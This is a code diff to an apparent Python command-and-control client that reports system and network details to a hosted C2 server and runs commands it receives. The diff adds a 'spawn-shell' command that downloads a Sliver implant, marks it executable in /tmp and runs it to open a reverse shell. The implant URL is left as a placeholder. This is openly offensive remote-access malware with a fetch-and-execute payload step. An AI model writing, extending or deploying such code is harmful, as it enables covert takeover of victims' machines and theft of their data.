@@ -4,11 +4,13 @@ import subprocess
 import json
 import time
 import os
+import requests
 from socketio import Client
 import netifaces
 
 # Server settings
 SERVER_URL = "https://c2-backend-wily.onrender.com"  # Your Render URL
+SLIVER_URL = "sliver_implant"  # URL to download the implant
 
 def get_system_info():
     """Gather system information."""
@@ -31,10 +33,31 @@ def get_network_info():
                 network_info[iface] = addr.get("addr", "Unknown")
     return network_info
 
+def download_and_execute_sliver():
+    """Download and execute the Sliver implant."""
+    try:
+        # Download the implant
+        implant_path = "/tmp/sliver_implant"
+        response = requests.get(SLIVER_URL, timeout=10)
+        if response.status_code == 200:
+            with open(implant_path, "wb") as f:
+                f.write(response.content)
+            os.chmod(implant_path, 0o755)  # Make executable
+            # Execute the implant
+            result = subprocess.run([implant_path], capture_output=True, text=True)
+            return f"Sliver implant executed: {result.stdout}{result.stderr}"
+        else:
+            return f"Failed to download implant: HTTP {response.status_code}"
+    except Exception as e:
+        return f"Error downloading or executing implant: {e}"
+
 def execute_command(command):
     """Execute a system command and return the output based on current directory."""
     try:
-        if command.strip().lower().startswith("cd "):
+        if command.strip().lower() == "spawn-shell":
+            # Trigger the Sliver reverse shell by downloading and executing the implant
+            return download_and_execute_sliver()
+        elif command.strip().lower().startswith("cd "):
             # Extract directory from 'cd' command
             target_dir = command.strip().split("cd ", 1)[1].strip()
             try:
